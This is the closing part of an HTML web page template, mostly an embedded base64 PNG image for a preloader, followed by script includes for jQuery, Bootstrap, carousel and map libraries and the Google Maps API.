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"
                    />
                </svg>
            </div>
        </div>
    </div>
</div>
<!-- preloader end -->
    <!-- jquery -->
    <script src="assets/js/jquery.js"></script>
    <!-- bootstrap -->
    <script src="assets/js/bootstrap.min.js"></script>
    <!-- slicknav -->
    <script src="assets/js/jquery.slicknav.min.js"></script>
    <!-- imagesloaded -->
    <script src="assets/js/imagesloaded.pkgd.min.js"></script>
    <!-- owl carousel -->
    <script src="assets/js/owl.carousel.min.js"></script>
    <!-- isotope -->
    <script src="assets/js/isotope.pkgd.min.js"></script>
    <!-- circle magic -->
    <script src="assets/js/circleMagic.min.js"></script>
    <!-- ripple effect -->
    <script src="assets/js/jquery.ripples-min.js"></script>
    <!-- Google map activation -->
    <script src="assets/js/google.map.activation.js"></script>
    <!-- google map api -->
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDi-rrw9lb-uKY1vHd9gkzuBpj4-hiBsUA&callback=initMap" async
        defer></script>
    <!-- main -->
    <script src="assets/js/main.js"></script>
</body>
</html>